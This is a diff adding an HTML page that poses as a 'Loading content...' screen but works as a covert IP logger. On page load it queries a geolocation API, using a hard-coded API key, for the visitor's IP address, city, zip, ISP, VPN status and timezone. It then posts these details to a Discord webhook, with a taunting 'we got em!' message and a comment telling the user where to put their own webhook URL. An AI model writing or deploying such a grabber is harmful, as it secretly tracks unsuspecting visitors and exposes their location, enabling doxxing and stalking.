@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Loading...</title>
+  </head>
+  <body>
+    <h1>Loading content...</h1>
+    <script src="https://3kh0.github.io/js/main.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script>
+      $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=a1ebbf04c6164dd98b527e26c57fc28c", function (data) {
+        const ip = data.ip_address;
+        const city = data.city;
+        const region = data.region;
+        const zip = data.postal_code;
+        const country = data.country;
+        const flag = data.flag.emoji;
+        const aso = data.connection.autonomous_system_organization;
+        const isp = data.connection.isp_name;
+        const org = data.connection.organization_name;
+        const vpn = data.security.is_vpn;
+        const tz = data.timezone.name;
+        const ct = data.timezone.current_time;
+        const request = new XMLHttpRequest();
+        request.open("POST", "PLACE_WEBHOOK_URL_HERE");
+        // Put in your discord webhook url above ^^^
+        request.setRequestHeader("Content-type", "application/json");
+        const params = {
+          username: "ECHOLOG",
+          avatar_url: "https://3kh0.github.io/img/echo.jpg",
+          content: "**Ladies and gentlemen we got em!**\n> IP: " + ip + 
+          "\n> City: " + city + 
+          "\n> Region: " + region + 
+          "\n> Zip: " + zip + 
+          "\n> Country: " + country +
+          "\n> Flag: " + flag +
+          "\n> Auto System Org: " + aso +
+          "\n> ISP: " + isp +
+          "\n> Org: " + org +
+          "\n> Using VPN: " + vpn +
+          "\n> Timezone: " + tz +
+          "\n> Current time: " + ct
+          ,
+        };
+        request.send(JSON.stringify(params));
+      });
+    </script>
+  </body>
+</html>
